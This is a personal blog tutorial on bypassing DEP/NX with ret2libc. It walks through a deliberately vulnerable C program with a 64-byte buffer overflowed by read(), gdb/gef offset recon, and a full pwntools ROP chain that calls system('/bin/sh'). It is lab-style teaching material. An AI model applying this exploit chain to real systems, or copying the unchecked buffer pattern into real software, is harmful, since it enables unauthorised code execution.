---
title: "DEP NX ret2libc"
datePublished: 2026-10-15T02:51:37.294Z
cuid: cmv8xzyrc000002np7a2l16hv
slug: dep-nx-ret2libc

---

## Where we are in the series

*Hello World.* It has been a long time since I have written a new blog post. Some would say it has been over a year. Like everyone else I have gotten busy with life and honestly just forgot. But now I'm back and focused so for the 3 people that will read this have no fear, your content is here. The last blog post I wrote was about bypassing a `Stack Canary`. As a reminder a `Stack Canary` is just a value that if overwritten alerts the program that `Stack Smashing` has occurred. If we can leak that canary then we can write it onto the stack and still execute our shell code. However, what if the program doesn't allow us to execute code directly from the stack? In comes `DEP` or `Data Execution Prevention`, which achieves just that. The focus of this blog post is going to be how we can bypass `DEP` using `ret2libc`.

**Protections in play:**

| Protection | Status | Flag |
| --- | --- | --- |
| Stack canary | \[off\] | `-fno-stack-protector` |
| NX / DEP | \[on\] | default (no `-zexecstack`) |
| PIE / ASLR | \[off\] | `-no-pie` |
| RELRO | \[partial\] | default |

* * *

## The protection mechanism

`Data Execution Prevention` or `DEP` as it will be referred to as from here on out is a memory protection mechanism that ensures that memory pages that hold data (the stack, the heap, etc) are not executable. Additionally, it ensures that memory locations that hold code like the `.text` libraries are not writable.

At a deeper level every page (typically 4KB segment in memory) in a processes virtual memory address space has permission bits set in the corresponding `page table entry` : `read` , `write` , `execute` . On x86\_64 bit systems the execute permission lives in the `No-eXecute` or `NX` bit which is `bit 63` of the page table entry. When the CPU fetches an instruction from a virtual memory address, the `MMU` will “walk” the `page tables` and check the `NX` bit on the page for the address it is concerned with. If that bit is set then a fault is raised (`SIGSEGV` ). This is run on every instruction fetch.

We can see this difference on the stack if we compile the vulnerable program with both `DEP` enabled and disabled. On the left we compiled the program by omitting the `-zexecstack` flag therefore enabling `DEP` . On the right we compiled the program with the flag included which has an obvious impact.

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/93b1d15b-1220-42d5-b850-a9aa044a2dd8.png align="center")

Once we execute the program using `gdb` we can use the command `vmmap` to see the virtual memory map. From the picture we see the `stack` towards the bottom. On the left we note that the executable bit is not set, where on the right that bit is set allowing for execution of potential shellcode from the stack.

So how does the compilation process decide that a program will or will not have the executable bit set on non executable regions of memory? When an `ELF` is produced by a linker a program header called `GNU_STACK` is written to the program, which tells the kernel what permissions to give the stack when the program is loaded. This defaults to `RW` and omits `X`. However, when we set `zexecstack` that bit is flipped resulting in `RWX` for the stack.

We can again observe this by using the `readelf` command and `grepping` for the `GNU_STACK` header and seeing the difference.

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/b3788106-f25a-46c2-86ae-319e17df1091.png align="center")

## The vulnerable program

We'll use a small vulnerable program along the same lines as the stack canary post, except this time we compile it to enable `DEP`. The important detail is that input comes in through `read()`, which takes raw bytes. That matters later: our exploit chain is full of addresses packed with null bytes, and `read()` happily writes them where something like `scanf("%s", ...)` would truncate at the first null.

```c
#include <stdio.h>
#include <unistd.h>

// The vulnerable function. buf is 64 bytes but read() will write up to 256,
// so there is nothing stopping us from running off the end of it. That's the
// whole point.
void vulnerable_function() {
    char buf[64];
    printf("Whisper a secret: ");
    fflush(stdout);
    read(0, buf, 256);
}

int main() {
    vulnerable_function();
    return 0;
}
```

* * *

## Compiling it

```bash
gcc -o vuln3 vuln3.c -fno-stack-protector -no-pie
```

*   `fno-stack-protector` — Disabling the stack canary
    
*   `no-pie` — Disabling ASLR
    

Sanity check with `checksec`:

```bash
andrew@ubuntu:~/Documents/SEREPO/SoftwareExploits/DEP Bypass$ checksec --file vuln3
[*] '/home/andrew/Documents/SEREPO/SoftwareExploits/DEP Bypass/vuln3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Canary is off, PIE is off, and `NX enabled` is exactly what we want — DEP is on and the stack is no longer executable.

One thing worth calling out before someone emails me about it: `SHSTK` and `IBT` both show `Enabled`. That's Intel CET — shadow stack and indirect branch tracking. Shadow stack in particular is the thing that would ruin a ROP chain, since it keeps its own protected copy of return addresses and faults if the one on the stack doesn't match. These bits being set in the ELF is not the same as the protection being enforced at runtime though. CET needs the CPU, the kernel, and glibc all cooperating, and on this box it isn't actually enforced, which is why the chain below still works. If it were enforced, the first `ret` into our gadget would fault instead.

* * *

## Recon in gdb

```plaintext
gdb ./vuln3
```

We can run the following commands to investigate the program and set a breakpoint. Once we do that we can see the `read` call that drops our input onto the stack where the memory for the variable `buf` is allocated.

```plaintext
gef> disassemble vulnerable_function
gef> break *vulnerable_function + 73
gef> run
```

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/da943ded-1d69-4a66-9bb2-90670f8df137.png align="center")

From there we are prompted for our input where we can enter data into the `read` function.

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/481f358e-c42c-4104-99b6-3925c6584f3a.png align="center")

We can see all of the A’s that were entered onto the stack.

However, if we rerun the program and only enter a few A’s we can see the return address on the stack pointing back to normal program flow.

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/87c2cd5e-4b84-4581-bac8-b21bb4ddd263.png align="center")

We can easily now find the offset using the pattern create functionality with `gef`

### Finding the offset

```plaintext
gef> pattern create 200
gef> r
gef> pattern search $rsp
```

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/2ddf1ac5-57d0-4bae-8f9c-c5e2b16ce185.png align="center")

We can also see that the `$rsp` register contains the values `x616161616161616161` . To see where this lives on the stack we can even expand the stack with the following command in `gef`

```bash
gef config context.nb_lines_stack 32
```

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/268cc412-07b4-4d69-b0b7-6a81b40b9105.png align="center")

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/bf29dda0-be57-4e79-a961-0afb5b36b026.png align="center")

Prior to `ret` being executed we see that `jaaaaakaaaa` is where the return address should be. Meaning that the offset is located at `offset 72`. That lines up with the layout: 64 bytes for `buf` plus the 8 byte saved frame pointer gets us to the saved return address.

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/aea294b6-18ff-485d-b910-85313293e6c4.png align="center")

* * *

## The exploit

Building the exploit. The first thing we can do is ensure that we can interact with the program using pwntools and gdb..

```python
#!/usr/bin/env python3

from pwn import * # Import the entire pwntools library

context.arch = "x86_64" # Set the Architecture to 64 bit

p = gdb.debug("./vuln3") # Execute the vulnerable program using gdb for debugging purposes.

p.sendline(b"A"*72) # Send 72 bytes to overwrite the return pointer

p.interactive()
```

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/532dc967-4609-4666-8e0e-8f7094be87b6.png align="center")

Now this is where in the past we would write shellcode to the stack and let it execute, however, that does not work anymore with `DEP` enabled. So we need to find a way to creatively gain a shell or access to another method for achieving our goals.

One of the methods that can be leveraged to circumvent the `DEP` problem is `ret2libc`. The premise behind `ret2libc` is that you do not need to inject your own shell code into the program because the program most of the time has exactly what you need in it. `libc` has the `system()` function inside of it, which will run a system command.

We can then massage the stack to set up `system()` to execute a program of our choice, which in this case will be `/bin/sh` . However, doing this requires us to set up the stack with the proper parameters in the proper order.

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/8d42f449-beb8-4dfd-9ff9-bdf74f2a20e9.png align="center")

![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/b4bb04df-9e26-444e-936d-a587cfb4c150.png align="center")

* * *

## Popping the shell

The final exploit chain was as follows:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "x86_64"
context.log_level = "info"

p = process("./vuln3", aslr=False)
libc = p.libc

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret_pad = rop.find_gadget(["ret"]).address
system_addr = libc.sym["system"]
binsh_addr = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * 72
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret_pad)
payload += p64(system_addr)

p.sendlineafter(b"Whisper a secret: ", payload)
p.interactive()
```

```plaintext
$ ./sol3_final.py
```

> ![](https://cdn.hashnode.com/uploads/covers/69b3563693256dfc5319f409/fe653aca-d4e2-469a-8d76-e2162f92983a.png align="center")

* * *

## What just happened

In the canary post we still ended up executing instructions we placed on the stack. With DEP (NX) enabled, that region is no longer executable: the CPU will fault if it tries to fetch code from the stack. We still control where the function returns, but we have to return into code that is already allowed to run, typically libc.

That’s ret2libc: reuse `system()` and the `"/bin/sh"` string from the C library instead of injecting shellcode.

We start `vuln3` with `process(..., aslr=False)` so libc loads at a predictable base on each run. `libc = p.libc` is the important step: pwntools reads `/proc/<pid>/maps` and sets `libc.address` to where this process’s libc is mapped. Every value we pull from libc `libc.sym["system"]`, `libc.search(b"/bin/sh")`, and gadgets from `ROP(libc)`, is then a full virtual address (base + offset), not a small offset from the file on disk. Mixing those offsets with real addresses was the bug in my first draft exploit, and an important learning opportunity for me. By mixing offset from the base program address with the base of `libc` it breaks the exploit chain. Therefore, we either need to use full memory addresses or reference the offset from the same base address for the entire chain.

`ROP(libc)` searches libc’s executable segments for useful instruction sequences. It ultimately finds the ROP gadgets in the `libc` library and saves them into memory as the `rop` variable, which can be searched using the `rop.find_gadget` command. We need:

*   `pop rdi; ret` : on x86-64, the first integer/pointer argument goes in RDI. This gadget pops the next stack qword into RDI, then `ret`’s to the following address.
    
*   A plain `ret` : not for “extra control flow,” but for stack alignment. When we enter `system` via ROP we don’t get the same `call`\-instruction stack alignment glibc expects; an extra `ret` before `system` avoids `movaps` crashes inside `do_system` on some builds.
    

The payload is still `72` bytes of padding (everything from the buffer through the saved frame pointer) to reach the saved return address, then four pointers laid out as the CPU will consume them on `ret`:

1.  `pop_rdi` : return here after the overflow.
    
2.  `binsh_addr` : popped into RDI (argument to `system`).
    
3.  `ret_pad` : alignment shim.
    
4.  `system_addr` : `system("/bin/sh")` runs; `p.interactive()` gives you the shell in that process.
    

DEP didn’t stop the overflow; it only removed stack-as-code. We redirected execution into libc, which was executable all along.

* * *

## Up next

In the next post we're turning on `no-pie` or position independent execution, which makes our job significantly more difficult. We'll need to leak the base address and calculate offsets to get around it.

* * *

*Code from this post lives at \[REPO LINK\]. Find me on Medium @andrewcpowers88 — questions and corrections welcome.*